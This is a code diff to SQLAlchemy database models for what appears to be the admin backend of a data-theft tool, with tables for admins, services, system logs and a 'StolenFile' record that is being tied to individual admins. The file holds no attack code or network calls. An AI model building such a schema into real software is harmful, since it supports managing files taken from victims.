@@ -1,10 +1,9 @@
-from sqlalchemy import Column, Integer, String, Boolean, DateTime, Text, JSON
+# models/db_models.py
+from sqlalchemy import Column, Integer, String, Boolean, DateTime, Text, JSON, ForeignKey
 from sqlalchemy.ext.declarative import declarative_base
+from sqlalchemy.orm import relationship
 from datetime import datetime
 
-print("🔄 Loading database models...")
-
-# Створи локальний Base
 Base = declarative_base()
 
 class Admin(Base):
@@ -14,6 +13,7 @@ class Admin(Base):
     username = Column(String(50), unique=True, nullable=False)
     password_hash = Column(String(255), nullable=False)
     is_active = Column(Boolean, default=True)
+    is_main_admin = Column(Boolean, default=False)
     created_at = Column(DateTime, default=datetime.utcnow)
     last_login = Column(DateTime)
 
@@ -51,7 +51,10 @@ class StolenFile(Base):
     data_type = Column(String(50))
     file_path = Column(String(500))
     file_size = Column(Integer)
+    admin_id = Column(Integer, ForeignKey('admins.id'))
     created_at = Column(DateTime, default=datetime.utcnow)
+    
+    admin = relationship("Admin")
 
 class Service(Base):
     __tablename__ = 'services'
@@ -68,9 +71,9 @@ class SystemLog(Base):
     __tablename__ = 'system_logs'
     
     id = Column(Integer, primary_key=True)
-    level = Column(String(20))
-    module = Column(String(100))
-    message = Column(Text)
-    timestamp = Column(DateTime, default=datetime.utcnow)
-
-print("✅ Database models loaded successfully")
+    event_type = Column(String(50))
+    admin_id = Column(Integer, ForeignKey('admins.id'))
+    details = Column(Text)
+    created_at = Column(DateTime, default=datetime.utcnow)
+    
+    admin = relationship("Admin")
